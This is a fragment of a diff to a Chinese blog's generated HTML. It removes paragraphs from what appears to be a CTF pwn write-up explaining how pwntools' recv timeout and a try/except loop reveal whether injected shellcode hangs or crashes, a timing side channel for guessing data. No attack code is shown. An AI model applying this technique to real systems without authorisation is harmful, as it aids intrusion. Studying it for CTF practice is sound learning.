-<p>我对于<code>p.recv(timeout = 0.01)</code>的理解：<code>p.recv()</code>用于接收程序的输出，但是如果程序没有输出的话正常情况下<code>p.recv()</code>就会造成阻塞，设置的<code>timeout</code>参数就是用来防止这个阻塞过久，超过设定的时间之后就会退出<code>p.recv()</code>，但是在这期间即便没有接收到输出也不会报错。</p>
-<p>那么对于这题而言<code>p.recv(timeout = 0.1)</code>的作用就在于阻塞程序0.01秒，如果这0.01秒内程序还在运行的话，<code>p.recv()</code>则会正常退出，进入 if 处的判断，但如果这0.01秒内程序已经结束了，那么在<code>p.recv()</code>处脚本会报错，从而进入 except 中处理。结合<code>while True</code>就是利用<code>p.recv()</code>来判断在 <code>time.time() - start_time</code>期间程序是否还在运行，显然程序如果在执行shellcode时进入了loop循环，那么程序执行的时间会比较大，从而在某次while的循环中进入if中处理，但是如果程序直接挂掉了，那么脚本就进入except中处理。</p>
-<p>以上部分属于个人理解，可能有些不准确，但是总体是没错的。算法部分很简单，简单理解下即可。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1608,14 +1614,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">64</span>
+          <span class="site-state-item-count">65</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-count">44</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
